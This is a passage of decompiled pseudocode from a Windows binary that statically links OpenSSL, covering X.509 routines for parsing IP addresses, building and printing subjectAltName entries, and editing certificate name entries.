        v6 = 1;
        *v3 = 0;
        v7 = sub_44D610(v4);
        if ( !v7 )
        {
          sub_408310(34, 109, 109, "crypto\\x509v3\\v3_utl.c", 294);
          goto LABEL_26;
        }
        sub_44CF10(v1, v7, (int **)&v11);
        v1 = 0;
        v4 = v3 + 1;
      }
      v5 = *++v3;
    }
    while ( v5 );
    if ( v6 != 2 )
      goto LABEL_24;
    v8 = sub_44D610(v4);
    if ( !v8 )
    {
      sub_408310(34, 109, 109, "crypto\\x509v3\\v3_utl.c", 309);
      goto LABEL_26;
    }
    sub_44CF10(v1, v8, (int **)&v11);
  }
  else
  {
LABEL_24:
    v9 = sub_44D610(v4);
    if ( !v9 )
    {
      sub_408310(34, 109, 108, "crypto\\x509v3\\v3_utl.c", 316);
      goto LABEL_26;
    }
    sub_44CF10(v9, 0, (int **)&v11);
  }
  sub_413490(Block);
  return v11;
}
// 44D91A: conditional instruction was optimized away because ebp.4==2
// 408310: using guessed type _DWORD __cdecl sub_408310(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (0044DA70) --------------------------------------------------------
int __cdecl sub_44DA70(char *Buffer, int a2, _DWORD *a3)
{
  int v3; // eax
  int v5; // ecx

  v3 = a3[4];
  if ( v3 == 16 )
    return 0;
  if ( !a2 )
  {
    v5 = a3[5];
    if ( v5 == -1 )
    {
      ++a3[6];
      a3[5] = v3;
      return 1;
    }
    if ( v5 == v3 )
    {
      ++a3[6];
      return 1;
    }
    return 0;
  }
  if ( a2 <= 4 )
  {
    if ( !sub_44D780(a2, Buffer, (_BYTE *)a3 + v3) )
      return 0;
    a3[4] += 2;
    return 1;
  }
  else
  {
    if ( v3 > 12 || Buffer[a2] || !sub_44D6F0((_BYTE *)a3 + v3, Buffer) )
      return 0;
    a3[4] += 4;
    return 1;
  }
}

//----- (0044DB00) --------------------------------------------------------
int __cdecl sub_44DB00(char *Str)
{
  _DWORD *v1; // ecx
  _DWORD *v2; // esi
  int result; // eax
  size_t v4; // edi
  int v5; // ebx
  int v6; // edx
  int v7; // eax
  int v8; // ecx
  int Src[4]; // [esp+4h] [ebp-20h] BYREF
  int v10; // [esp+14h] [ebp-10h]
  size_t Size; // [esp+18h] [ebp-Ch]
  int v12; // [esp+1Ch] [ebp-8h]

  v2 = v1;
  v10 = 0;
  Size = -1;
  v12 = 0;
  result = sub_441130(Str, 58, 0, (int (__cdecl *)(char *, int, int))sub_44DA70, (int)Src);
  if ( result )
  {
    v4 = Size;
    if ( Size == -1 )
    {
      if ( v10 != 16 )
        return 0;
      goto LABEL_19;
    }
    v5 = v10;
    if ( v10 == 16 || v12 > 3 )
      return 0;
    if ( v12 == 3 )
    {
      if ( v10 > 0 )
        return 0;
    }
    else if ( v12 == 2 )
    {
      if ( !Size )
        goto LABEL_17;
      if ( Size != v10 )
        return 0;
    }
    else if ( !Size || Size == v10 )
    {
      return 0;
    }
    if ( (Size & 0x80000000) != 0 )
    {
LABEL_19:
      v6 = Src[1];
      v7 = Src[2];
      *v2 = Src[0];
      v8 = Src[3];
      v2[1] = v6;
      v2[2] = v7;
      v2[3] = v8;
      return 1;
    }
LABEL_17:
    memcpy(v2, Src, Size);
    memset((char *)v2 + v4, 0, 16 - v5);
    if ( v10 != Size )
    {
      memcpy((char *)v2 + Size - v10 + 16, (char *)Src + Size, v10 - Size);
      return 1;
    }
    return 1;
  }
  return result;
}
// 44DB1A: variable 'v1' is possibly undefined

//----- (0044DC80) --------------------------------------------------------
int __cdecl sub_44DC80(_BYTE *a1, char *Str)
{
  if ( strchr(Str, 58) )
    return sub_44DB00(Str) != 0 ? 0x10 : 0;
  else
    return sub_44D6F0(a1, Str) != 0 ? 4 : 0;
}

//----- (0044DCC0) --------------------------------------------------------
_DWORD *__cdecl sub_44DCC0(char *Str)
{
  size_t v1; // edi
  _DWORD *v2; // esi
  char Src[16]; // [esp+8h] [ebp-14h] BYREF

  if ( strchr(Str, 58) )
  {
    if ( sub_44DB00(Str) )
    {
      v1 = 16;
      goto LABEL_6;
    }
    return 0;
  }
  if ( !sub_44D6F0(Src, Str) )
    return 0;
  v1 = 4;
LABEL_6:
  v2 = sub_42C430();
  if ( !v2 )
    return 0;
  if ( !sub_437A10((int)v2, Src, v1) )
  {
    sub_42C4F0(v2);
    return 0;
  }
  return v2;
}

//----- (0044DD70) --------------------------------------------------------
char *__cdecl sub_44DD70(char *Str)
{
  _DWORD *v1; // ebp
  char *result; // eax
  char *v3; // edi
  char *v4; // eax
  char *v5; // esi
  char *v6; // edi
  int v7; // eax
  int v8; // ebx
  int v9; // edi
  _BYTE Src[32]; // [esp+Ch] [ebp-24h] BYREF

  v1 = 0;
  result = strchr(Str, 47);
  v3 = result;
  if ( result )
  {
    v4 = (char *)sub_4247B0(Str);
    v5 = v4;
    if ( v4 )
    {
      v6 = &v3[v4 - Str];
      *v6 = 0;
      v7 = sub_44DC80(Src, v4);
      v8 = v7;
      if ( v7 )
      {
        v9 = sub_44DC80(&Src[v7], v6 + 1);
        sub_413490(v5);
        v5 = 0;
        if ( v9 )
        {
          if ( v8 == v9 )
          {
            v1 = sub_42C430();
            if ( v1 )
            {
              if ( sub_437A10((int)v1, Src, v8 + v9) )
                return (char *)v1;
            }
          }
        }
      }
      sub_413490(v5);
      sub_42C4F0(v1);
    }
    return 0;
  }
  return result;
}
// 44DD70: using guessed type _BYTE Src[32];

//----- (0044DE80) --------------------------------------------------------
int __cdecl sub_44DE80(int a1)
{
  int v1; // eax
  int (__cdecl *v2)(_DWORD); // eax

  if ( *(_DWORD *)(a1 + 24) )
  {
    v1 = *(_DWORD *)(a1 + 20);
    if ( v1 )
    {
      v2 = *(int (__cdecl **)(_DWORD))(v1 + 4);
      if ( v2 )
        return v2(*(_DWORD *)(a1 + 24));
    }
  }
  sub_408310(34, 142, 148, (int)"crypto\\x509v3\\v3_conf.c", 381);
  return 0;
}

//----- (0044DEC0) --------------------------------------------------------
void __cdecl sub_44DEC0(int a1, int a2)
{
  void (__cdecl *v2)(_DWORD); // eax

  if ( a2 )
  {
    v2 = *(void (__cdecl **)(_DWORD))(*(_DWORD *)(a1 + 20) + 12);
    if ( v2 )
      v2(*(_DWORD *)(a1 + 24));
  }
}

//----- (0044DF30) --------------------------------------------------------
int __cdecl sub_44DF30(int a1, int a2, int a3)
{
  _DWORD *v3; // ecx
  unsigned __int8 *v4; // ebx
  int i; // ebp
  unsigned int v6; // eax
  char *v7; // edi
  char *v9; // edi
  int v12; // [esp+4h] [ebp-110h] BYREF
  char v13[7]; // [esp+8h] [ebp-10Ch] BYREF
  char v14; // [esp+Fh] [ebp-105h] BYREF
  char Destination[256]; // [esp+10h] [ebp-104h] BYREF

  v12 = a3;
  switch ( *(_DWORD *)a2 )
  {
    case 0:
      sub_44CF10("othername", "<unsupported>", (int **)&v12);
      return v12;
    case 1:
      sub_44CFF0((void *)"email", *(void **)(*(_DWORD *)(a2 + 4) + 8), (int)&v12);
      return v12;
    case 2:
      sub_44CFF0((void *)"DNS", *(void **)(*(_DWORD *)(a2 + 4) + 8), (int)&v12);
      return v12;
    case 3:
      sub_44CF10("X400Name", "<unsupported>", (int **)&v12);
      return v12;
    case 4:
      sub_4452F0(*(int **)(a2 + 4), Destination, 256);
      sub_44CF10("DirName", Destination, (int **)&v12);
      return v12;
    case 5:
      sub_44CF10("EdiPartyName", "<unsupported>", (int **)&v12);
      return v12;
    case 6:
      sub_44CFF0((void *)"URI", *(void **)(*(_DWORD *)(a2 + 4) + 8), (int)&v12);
      return v12;
    case 7:
      v3 = *(_DWORD **)(a2 + 4);
      v4 = (unsigned __int8 *)v3[2];
      if ( *v3 == 4 )
      {
        sub_4191B0((int)Destination, 256, "%d.%d.%d.%d", *v4);
LABEL_20:
        sub_44CF10("IP Address", Destination, (int **)&v12);
        return v12;
      }
      if ( *v3 == 16 )
      {
        Destination[0] = 0;
        for ( i = 0; i < 8; ++i )
        {
          sub_4191B0((int)v13, 5, "%X", v4[1] | (*v4 << 8));
          v4 += 2;
          v6 = strlen(v13) + 1;
          v7 = &v14;
          while ( *++v7 )
            ;
          qmemcpy(v7, v13, v6);
          if ( i != 7 )
          {
            v9 = &v14;
            while ( *++v9 )
              ;
            *(_WORD *)v9 = 58;
          }
        }
        goto LABEL_20;
      }
      sub_44CF10("IP Address", "<invalid>", (int **)&v12);
      return v12;
    case 8:
      sub_4229E0(Destination, 256, *(_DWORD *)(a2 + 4));
      sub_44CF10("Registered ID", Destination, (int **)&v12);
      return v12;
    default:
      return v12;
  }
}

//----- (0044E1B0) --------------------------------------------------------
int __cdecl sub_44E1B0(int a1, int a2)
{
  int result; // eax
  _DWORD *v3; // eax
  unsigned __int8 *v4; // esi
  int v5; // ebx

  switch ( *(_DWORD *)a2 )
  {
    case 0:
      sub_419190(a1, "othername:<unsupported>");
      result = 1;
      break;
    case 1:
      sub_419190(a1, "email:%s", *(const char **)(*(_DWORD *)(a2 + 4) + 8));
      result = 1;
      break;
    case 2:
      sub_419190(a1, "DNS:%s", *(const char **)(*(_DWORD *)(a2 + 4) + 8));
      result = 1;
      break;
    case 3:
      sub_419190(a1, "X400Name:<unsupported>");
      result = 1;
      break;
    case 4:
      sub_419190(a1, "DirName:");
      sub_445220(a1, *(int **)(a2 + 4), 0, 8520479);
      result = 1;
      break;
    case 5:
      sub_419190(a1, "EdiPartyName:<unsupported>");
      result = 1;
      break;
    case 6:
      sub_419190(a1, "URI:%s", *(const char **)(*(_DWORD *)(a2 + 4) + 8));
      result = 1;
      break;
    case 7:
      v3 = *(_DWORD **)(a2 + 4);
      v4 = (unsigned __int8 *)v3[2];
      if ( *v3 == 4 )
      {
        sub_419190(a1, "IP Address:%d.%d.%d.%d", *v4, v4[1], v4[2], v4[3]);
        result = 1;
      }
      else if ( *v3 == 16 )
      {
        sub_419190(a1, "IP Address");
        v5 = 8;
        do
        {
          sub_419190(a1, ":%X", v4[1] | (*v4 << 8));
          v4 += 2;
          --v5;
        }
        while ( v5 );
        sub_4051D0(a1, (int)"\n");
        result = 1;
      }
      else
      {
        sub_419190(a1, "IP Address:<invalid>");
        result = 1;
      }
      break;
    case 8:
      sub_419190(a1, "Registered ID:");
      sub_422A00(a1, *(_DWORD *)(a2 + 4));
      goto LABEL_17;
    default:
LABEL_17:
      result = 1;
      break;
  }
  return result;
}

//----- (0044E3A0) --------------------------------------------------------
int __usercall sub_44E3A0@<eax>(_DWORD *a1@<ecx>, int *a2@<ebx>)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  void **v7; // esi
  int v8; // edi
  int v9; // eax

  if ( !a1 )
    goto LABEL_14;
  if ( *a1 == 1 )
    return 1;
  v3 = a1[1];
  if ( !v3 )
  {
LABEL_14:
    sub_408310(34, 123, 127, (int)"crypto\\x509v3\\v3_alt.c", 233);
    return 0;
  }
  v4 = sub_431A40(v3, 0x55u, -1);
  if ( v4 < 0 )
    return 1;
  v5 = sub_431A50(a1[1], v4);
  if ( !v5 || (v6 = sub_44CD20(v5), (v7 = (void **)v6) == 0) )
  {
    sub_408310(34, 123, 126, (int)"crypto\\x509v3\\v3_alt.c", 241);
    return 0;
  }
  v8 = 0;
  if ( sub_426A30(v6) <= 0 )
  {
LABEL_10:
    sub_4269F0(v7);
    return 1;
  }
  while ( 1 )
  {
    v9 = sub_426A40((int *)v7, v8);
    if ( !sub_4269B0(a2, v9) )
      break;
    if ( ++v8 >= sub_426A30((int)v7) )
      goto LABEL_10;
  }
  sub_408310(34, 123, 65, (int)"crypto\\x509v3\\v3_alt.c", 248);
  return 0;
}

//----- (0044E490) --------------------------------------------------------
int __cdecl sub_44E490(int a1, int *a2, int a3)
{
  void **v3; // ebx
  int v4; // edi
  int *v6; // eax
  int v7; // esi
  int v8; // ebp
  int v9; // eax
  _DWORD *v10; // eax
  int **v11; // [esp+14h] [ebp+4h]

  v3 = 0;
  v4 = 0;
  if ( !a1 )
    goto LABEL_19;
  if ( *(_DWORD *)a1 == 1 )
    return 1;
  if ( !*(_DWORD *)(a1 + 8) )
  {
    if ( *(_DWORD *)(a1 + 12) )
    {
      v6 = (int *)_fileno(*(FILE **)(a1 + 12));
      goto LABEL_9;
    }
LABEL_19:
    sub_408310(34, 122, 125, (int)"crypto\\x509v3\\v3_alt.c", 310);
    goto LABEL_20;
  }
  v6 = (int *)sub_432E80(*(_DWORD *)(a1 + 8));
LABEL_9:
  v11 = (int **)v6;
  v7 = sub_44F1A0(v6, 0x30u, -1);
  if ( v7 < 0 )
    return 1;
  while ( 1 )
  {
    v8 = sub_44EE70(v11, v7);
    v9 = sub_445DD0(v8);
    v3 = sub_432E00(v9);
    if ( a3 )
    {
      sub_44EEB0((int *)v11, v7);
      sub_42C950(v8);
      --v7;
    }
    if ( !v3 )
      break;
    v10 = (_DWORD *)sub_4332C0();
    v4 = (int)v10;
    if ( !v10 )
      break;
    v10[1] = v3;
    v3 = 0;
    *v10 = 1;
    if ( !sub_4269B0(a2, (int)v10) )
    {
      sub_408310(34, 122, 65, (int)"crypto\\x509v3\\v3_alt.c", 338);
      goto LABEL_20;
    }
    v4 = 0;
    v7 = sub_44F1A0((int *)v11, 0x30u, v7);
    if ( v7 < 0 )
      return 1;
  }
  sub_408310(34, 122, 65, (int)"crypto\\x509v3\\v3_alt.c", 331);
LABEL_20:
  sub_4332D0(v4);
  sub_42C4F0(v3);
  return 0;
}
// 44E4C5: conditional instruction was optimized away because ecx.4==0

//----- (0044E5D0) --------------------------------------------------------
BOOL __usercall sub_44E5D0@<eax>(char *a1@<ebx>, int a2@<edi>, int a3)
{
  char *v3; // esi
  int v5; // eax
  char *v6; // eax
  char *v7; // esi

  v3 = strchr(a1, 59);
  if ( !v3 )
    return 0;
  v5 = sub_433290();
  *(_DWORD *)(a2 + 4) = v5;
  if ( !v5 )
    return 0;
  sub_42C610(*(_DWORD *)(v5 + 4));
  *(_DWORD *)(*(_DWORD *)(a2 + 4) + 4) = sub_47F4C0(v3 + 1, a3);
  if ( !*(_DWORD *)(*(_DWORD *)(a2 + 4) + 4) )
    return 0;
  v6 = sub_424C00(a1, v3 - a1);
  v7 = v6;
  if ( !v6 )
    return 0;
  **(_DWORD **)(a2 + 4) = sub_423C60(v6, 0);
  sub_413490(v7);
  return **(_DWORD **)(a2 + 4) != 0;
}

//----- (0044E670) --------------------------------------------------------
int __cdecl sub_44E670(int a1, int a2, int a3)
{
  int v3; // ebx
  int v4; // esi
  int *v5; // edi
  int *v6; // eax

  v3 = 0;
  v4 = 0;
  v5 = (int *)sub_42C9D0();
  if ( !v5 )
    goto LABEL_4;
  v6 = (int *)sub_44DE80(a3);
  v4 = (int)v6;
  if ( !v6 )
  {
    sub_408310(34, 144, 150, (int)"crypto\\x509v3\\v3_alt.c", 551);
    sub_408610(2, "section=", a2);
LABEL_4:
    sub_42C9E0((int)v5);
    sub_44DEC0(a3, v4);
    return v3;
  }
  v3 = sub_44D7F0(v5, v6, 4097);
  if ( !v3 )
    goto LABEL_4;
  *(_DWORD *)(a1 + 4) = v5;
  sub_44DEC0(a3, v4);
  return v3;
}

//----- (0044E720) --------------------------------------------------------
_DWORD *__cdecl sub_44E720(int a1, int *a2, int a3)
{
  int i; // esi
  int v5; // eax

  for ( i = 0; i < sub_426A30((int)a2); ++i )
  {
    v5 = sub_426A40(a2, i);
    a3 = sub_44DF30(a1, v5, a3);
  }
  if ( a3 )
    return (_DWORD *)a3;
  else
    return sub_426AF0();
}

//----- (0044E780) --------------------------------------------------------
_DWORD *__cdecl sub_44E780(_DWORD *a1, int a2, int a3, int a4, char *Src, int a6)
{
  _DWORD *result; // eax
  int v7; // esi
  _DWORD *v8; // edi
  char **v9; // eax
  void *v10; // eax
  _DWORD *v11; // eax

  if ( !Src )
  {
    sub_408310(34, 164, 124, (int)"crypto\\x509v3\\v3_alt.c", 392);
    return 0;
  }
  v7 = (int)a1;
  if ( a1 )
  {
    v8 = a1;
  }
  else
  {
    v8 = (_DWORD *)sub_4332C0();
    if ( !v8 )
    {
      sub_408310(34, 164, 65, (int)"crypto\\x509v3\\v3_alt.c", 401);
      return 0;
    }
  }
  switch ( a4 )
  {
    case 0:
      if ( sub_44E5D0(Src, (int)v8, a3) )
        goto LABEL_11;
      sub_408310(34, 164, 147, (int)"crypto\\x509v3\\v3_alt.c", 446);
      goto LABEL_26;
    case 1:
    case 2:
    case 6:
      v11 = sub_42C520();
      v8[1] = v11;
      if ( !v11 )
        goto LABEL_24;
      if ( sub_432910((int)v11, Src, strlen(Src)) )
        goto LABEL_11;
      v7 = (int)a1;
LABEL_24:
      sub_408310(34, 164, 65, (int)"crypto\\x509v3\\v3_alt.c", 459);
      goto LABEL_26;
    case 4:
      if ( sub_44E670((int)v8, (int)Src, a3) )
        goto LABEL_11;
      sub_408310(34, 164, 149, (int)"crypto\\x509v3\\v3_alt.c", 439);
      goto LABEL_26;
    case 7:
      if ( a6 )
        v10 = sub_44DD70(Src);
      else
        v10 = sub_44DCC0(Src);
      v8[1] = v10;
      if ( v10 )
        goto LABEL_11;
      sub_408310(34, 164, 118, (int)"crypto\\x509v3\\v3_alt.c", 431);
      sub_408610(2, "value=", Src);
      goto LABEL_26;
    case 8:
      v9 = sub_423C60(Src, 0);
      if ( v9 )
      {
        v8[1] = v9;
LABEL_11:
        *v8 = a4;
        result = v8;
      }
      else
      {
        sub_408310(34, 164, 119, (int)"crypto\\x509v3\\v3_alt.c", 417);
        sub_408610(2, "value=", Src);
LABEL_26:
        if ( !v7 )
          sub_4332D0((int)v8);
        result = 0;
      }
      break;
    default:
      sub_408310(34, 164, 167, (int)"crypto\\x509v3\\v3_alt.c", 451);
      goto LABEL_26;
  }
  return result;
}

//----- (0044E970) --------------------------------------------------------
_DWORD *__cdecl sub_44E970(_DWORD *a1, int a2, int a3, int a4, int a5)
{
  char *v5; // esi
  char *v6; // edi
  int v8; // eax

  v5 = *(char **)(a4 + 4);
  v6 = *(char **)(a4 + 8);
  if ( !v6 )
  {
    sub_408310(34, 117, 124, (int)"crypto\\x509v3\\v3_alt.c", 486);
    return 0;
  }
  if ( !sub_44D6A0(v5, "email") )
  {
    v8 = 1;
    return sub_44E780(a1, a2, a3, v8, v6, a5);
  }
  if ( !sub_44D6A0(v5, "URI") )
  {
    v8 = 6;
    return sub_44E780(a1, a2, a3, v8, v6, a5);
  }
  if ( !sub_44D6A0(v5, "DNS") )
  {
    v8 = 2;
    return sub_44E780(a1, a2, a3, v8, v6, a5);
  }
  if ( !sub_44D6A0(v5, "RID") )
  {
    v8 = 8;
    return sub_44E780(a1, a2, a3, v8, v6, a5);
  }
  if ( !sub_44D6A0(v5, "IP") )
  {
    v8 = 7;
    return sub_44E780(a1, a2, a3, v8, v6, a5);
  }
  if ( !sub_44D6A0(v5, "dirName") )
  {
    v8 = 4;
    return sub_44E780(a1, a2, a3, v8, v6, a5);
  }
  v8 = sub_44D6A0(v5, "otherName");
  if ( !v8 )
    return sub_44E780(a1, a2, a3, v8, v6, a5);
  sub_408310(34, 117, 117, (int)"crypto\\x509v3\\v3_alt.c", 505);
  sub_408610(2, "name=", v5);
  return 0;
}

//----- (0044EAA0) --------------------------------------------------------
_DWORD *__cdecl sub_44EAA0(int a1, int a2, int a3)
{
  return sub_44E970(0, a1, a2, a3, 0);
}

//----- (0044EAC0) --------------------------------------------------------
int *__cdecl sub_44EAC0(int a1, _DWORD *a2, int a3)
{
  int *v3; // esi
  int *v5; // ebx
  int v6; // edi
  int v7; // esi
  const char *v8; // eax
  _DWORD *v9; // eax
  int *Block; // [esp+4h] [ebp-4h]

  v3 = sub_426AF0();
  Block = v3;
  if ( !v3 )
  {
    sub_408310(34, 153, 65, (int)"crypto\\x509v3\\v3_alt.c", 199);
    return 0;
  }
  v5 = (int *)a3;
  v6 = 0;
  if ( sub_426A30(a3) <= 0 )
    return v3;
  while ( 1 )
  {
    v7 = sub_426A40(v5, v6);
    if ( sub_44D6A0(*(char **)(v7 + 4), "issuer") )
      break;
    v8 = *(const char **)(v7 + 8);
    if ( !v8 || strcmp(v8, "copy") )
      break;
    if ( !sub_44E3A0(a2, Block) )
      goto LABEL_14;
    v5 = (int *)a3;
LABEL_11:
    if ( ++v6 >= sub_426A30((int)v5) )
      return Block;
  }
  v9 = sub_44E970(0, a1, (int)a2, v7, 0);
  if ( v9 )
  {
    sub_4269B0(Block, (int)v9);
    goto LABEL_11;
  }
LABEL_14:
  sub_426C00(Block, sub_4332D0);
  return 0;
}

//----- (0044EBE0) --------------------------------------------------------
int *__cdecl sub_44EBE0(int a1, int a2, int *a3)
{
  int *v3; // ebp
  int v5; // ebx
  int v6; // esi
  const char *v7; // eax
  int v8; // eax
  const char *v9; // eax
  _DWORD *v10; // eax

  v3 = sub_426AF0();
  if ( !v3 )
  {
    sub_408310(34, 154, 65, (int)"crypto\\x509v3\\v3_alt.c", 270);
    return 0;
  }
  v5 = 0;
  if ( sub_426A30((int)a3) > 0 )
  {
    while ( 1 )
    {
      v6 = sub_426A40(a3, v5);
      if ( !sub_44D6A0(*(char **)(v6 + 4), "email") )
      {
        v7 = *(const char **)(v6 + 8);
        if ( v7 )
        {
          if ( !strcmp(v7, "copy") )
            break;
        }
      }
      if ( !sub_44D6A0(*(char **)(v6 + 4), "email") )
      {
        v9 = *(const char **)(v6 + 8);
        if ( v9 )
        {
          if ( !strcmp(v9, "move") )
          {
            v8 = sub_44E490(a2, v3, 1);
LABEL_12:
            if ( !v8 )
              goto LABEL_13;
            goto LABEL_16;
          }
        }
      }
      v10 = sub_44E970(0, a1, a2, v6, 0);
      if ( !v10 )
      {
LABEL_13:
        sub_426C00(v3, sub_4332D0);
        return 0;
      }
      sub_4269B0(v3, (int)v10);
LABEL_16:
      if ( ++v5 >= sub_426A30((int)a3) )
        return v3;
    }
    v8 = sub_44E490(a2, v3, 0);
    goto LABEL_12;
  }
  return v3;
}

//----- (0044ED40) --------------------------------------------------------
int *__cdecl sub_44ED40(int a1, int a2, int *a3)
{
  int *v3; // ebx
  int v5; // esi
  int v6; // eax
  _DWORD *v7; // eax

  v3 = sub_426AF0();
  if ( v3 )
  {
    v5 = 0;
    if ( sub_426A30((int)a3) <= 0 )
    {
      return v3;
    }
    else
    {
      while ( 1 )
      {
        v6 = sub_426A40(a3, v5);
        v7 = sub_44E970(0, a1, a2, v6, 0);
        if ( !v7 )
          break;
        sub_4269B0(v3, (int)v7);
        if ( ++v5 >= sub_426A30((int)a3) )
          return v3;
      }
      sub_426C00(v3, sub_4332D0);
      return 0;
    }
  }
  else
  {
    sub_408310(34, 118, 65, (int)"crypto\\x509v3\\v3_alt.c", 362);
    return 0;
  }
}

//----- (0044EDF0) --------------------------------------------------------
int __cdecl sub_44EDF0(int *a1)
{
  int result; // eax

  result = (int)a1;
  if ( a1 )
    return sub_426A30(*a1);
  return result;
}

//----- (0044EE70) --------------------------------------------------------
int __cdecl sub_44EE70(int **a1, int a2)
{
  if ( a1 && sub_426A30((int)*a1) > a2 && a2 >= 0 )
    return sub_426A40(*a1, a2);
  else
    return 0;
}

//----- (0044EEB0) --------------------------------------------------------
int __cdecl sub_44EEB0(int *a1, int a2)
{
  int v3; // esi
  int *v4; // edi
  int v5; // ebx
  int v6; // ebp
  int v7; // eax
  int v9; // [esp+Ch] [ebp+4h]

  if ( !a1 )
    return 0;
  v3 = a2;
  if ( sub_426A30(*a1) <= a2 || a2 < 0 )
    return 0;
  v4 = (int *)*a1;
  v9 = sub_426960((int *)*a1, a2);
  v5 = sub_426A30((int)v4);
  a1[1] = 1;
  if ( a2 != v5 )
  {
    if ( a2 )
      v6 = *(_DWORD *)(sub_426A40(v4, a2 - 1) + 8);
    else
      v6 = *(_DWORD *)(v9 + 8) - 1;
    if ( v6 + 1 < *(_DWORD *)(sub_426A40(v4, a2) + 8) && a2 < v5 )
    {
      do
      {
        v7 = sub_426A40(v4, v3);
        --*(_DWORD *)(v7 + 8);
        ++v3;
      }
      while ( v3 < v5 );
    }
  }
  return v9;
}

//----- (0044EF60) --------------------------------------------------------
int __cdecl sub_44EF60(int *a1, void *a2, int a3, int a4)
{
  int *v5; // ebx
  int v6; // eax
  int v7; // edi
  int v8; // esi
  _DWORD *v9; // eax
  int v10; // ebp
  int v11; // ebp
  int i; // esi
  int v13; // eax
  BOOL v14; // [esp+8h] [ebp+4h]

  if ( !a1 )
    return 0;
  v5 = (int *)*a1;
  v6 = sub_426A30(*a1);
  v7 = a3;
  if ( a3 > v6 || a3 < 0 )
    v7 = v6;
  a1[1] = 1;
  if ( a4 == -1 )
  {
    if ( v7 )
    {
      v8 = *(_DWORD *)(sub_426A40(v5, v7 - 1) + 8);
      v14 = 0;
    }
    else
    {
      v8 = 0;
      v14 = 1;
    }
  }
  else
  {
    if ( v7 < v6 )
    {
      v8 = *(_DWORD *)(sub_426A40(v5, v7) + 8);
    }
    else if ( v7 )
    {
      v8 = *(_DWORD *)(sub_426A40(v5, v7 - 1) + 8) + 1;
    }
    else
    {
      v8 = 0;
    }
    v14 = v8 == 0;
  }
  v9 = sub_42C970(a2);
  v10 = (int)v9;
  if ( !v9 )
    goto LABEL_19;
  v9[2] = v8;
  if ( !sub_4268C0(v5, (int)v9, v7) )
  {
    sub_408310(11, 113, 65, (int)"crypto\\x509\\x509name.c", 225);
LABEL_19:
    sub_42C950(v10);
    return 0;
  }
  if ( v14 )
  {
    v11 = sub_426A30((int)v5);
    for ( i = v7 + 1; i < v11; ++i )
    {
      v13 = sub_426A40(v5, i - 1);
      ++*(_DWORD *)(v13 + 8);
    }
  }
  return 1;
}

//----- (0044F090) --------------------------------------------------------
BOOL __cdecl sub_44F090(void ***a1, int a2)
{
  void **v2; // eax

  if ( a1 && a2 )
  {
    sub_422B70(*a1);
    v2 = sub_439EE0(a2);
    *a1 = v2;
    return v2 != 0;
  }
  else
  {
    sub_408310(11, 115, 67, (int)"crypto\\x509\\x509name.c", 308);
    return 0;
  }
}

//----- (0044F0E0) --------------------------------------------------------
int __cdecl sub_44F0E0(int *a1, int a2, char *Src, signed int Size)
{
  signed int v4; // esi
  int v5; // eax
  int result; // eax

  if ( !a1 )
    return 0;
  v4 = Size;
  if ( !Src )
  {
    if ( Size )
      return 0;
  }
  if ( a2 > 0 && (a2 & 0x1000) != 0 )
  {
    v5 = sub_423680(*a1);
    return sub_47F850(a1 + 1, Src, Size, a2, v5) != 0;
  }
  if ( Size < 0 )
    v4 = strlen(Src);
  result = sub_432910(a1[1], Src, v4);
  if ( result )
  {
    if ( a2 != -1 )
    {
      if ( a2 == -2 )
      {
        *(_DWORD *)(a1[1] + 4) = sub_47F510((unsigned __int8 *)Src, v4);
        return 1;
      }
      *(_DWORD *)(a1[1] + 4) = a2;
    }
    return 1;
  }
  return result;
}

//----- (0044F1A0) --------------------------------------------------------
int __cdecl sub_44F1A0(int *a1, unsigned int a2, int a3)
{
  int v3; // esi
  int *v4; // edi
  int v5; // ebx
  int v6; // esi
  int *v7; // eax
  char **v8; // eax
  int v10; // [esp+8h] [ebp+8h]

  v8 = sub_423310(a2);
  if ( !v8 )
    return -2;
  v10 = (int)v8;
  if ( !a1 )
    return -1;
  v3 = a3;
  if ( a3 < 0 )
    v3 = -1;
  v4 = (int *)*a1;
  v5 = sub_426A30(*a1);
  v6 = v3 + 1;
  if ( v6 >= v5 )
    return -1;
  while ( 1 )
  {
    v7 = (int *)sub_426A40(v4, v6);
    if ( !sub_439FC0(*v7, v10) )
      break;
    if ( ++v6 >= v5 )
      return -1;
  }
  return v6;
}

//----- (0044F1C0) --------------------------------------------------------
void ***__cdecl sub_44F1C0(void ****a1, int a2, int a3, char *Src, signed int Size)
{
  void ***v5; // edi

  if ( !a1 || (v5 = *a1) == 0 )
  {
    v5 = (void ***)sub_42C940();
    if ( !v5 )
      return 0;
  }
  if ( !sub_44F090(v5, a2) || !sub_44F0E0((int *)v5, a3, Src, Size) )
  {
    if ( !a1 || v5 != *a1 )
      sub_42C950((int)v5);
    return 0;
  }
  if ( a1 && !*a1 )
    *a1 = v5;
  return v5;
}

//----- (0044F230) --------------------------------------------------------
void ***__cdecl sub_44F230(void ****a1, char *a2, int a3, char *Src, signed int Size)
{
  void **v5; // esi
  void ***v7; // edi

  v5 = (void **)sub_423C60(a2, 0);
  if ( v5 )
  {
    v7 = sub_44F1C0(a1, (int)v5, a3, Src, Size);
    sub_422B70(v5);
    return v7;
  }
  else
  {
    sub_408310(11, 131, 119, (int)"crypto\\x509\\x509name.c", 250);
    sub_408610(2, "name=", a2);
    return 0;
  }
}

//----- (0044F2A0) --------------------------------------------------------
void ***__cdecl sub_44F2A0(int *a1, char *a2, int a3, char *Src, signed int Size, int a6, int a7)
{
  void ***result; // eax
  int v8; // esi
  int v9; // edi

  result = sub_44F230(0, a2, a3, Src, Size);
  v8 = (int)result;
  if ( result )
  {
    v9 = sub_44EF60(a1, result, a6, a7);
    sub_42C950(v8);
    return (void ***)v9;
  }
  return result;
}

//----- (0044F2F0) --------------------------------------------------------
int __cdecl sub_44F2F0(int a1)
{
  int v2; // eax
  int v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  if ( (unsigned int)(a1 - 1) <= 8 )
    return a1 - 1;
  v3[0] = a1;
  if ( !dword_539284 )
    return -1;
  v2 = sub_426BE0(dword_539284, (int)v3);
  if ( v2 == -1 )
    return -1;
  else
    return v2 + 9;
}
// 539284: using guessed type int dword_539284;
// 44F2F0: using guessed type int var_1C[7];

//----- (0044F340) --------------------------------------------------------
_DWORD *__usercall sub_44F340@<eax>(int *a1@<esi>, int a2)
{
  int v2; // eax
  _DWORD *result; // eax
  int v4; // edi
  _DWORD *v5; // eax
  void *v6; // eax

  v2 = a1[1];
  if ( v2 )
  {
    if ( *(int *)v2 > 0 )
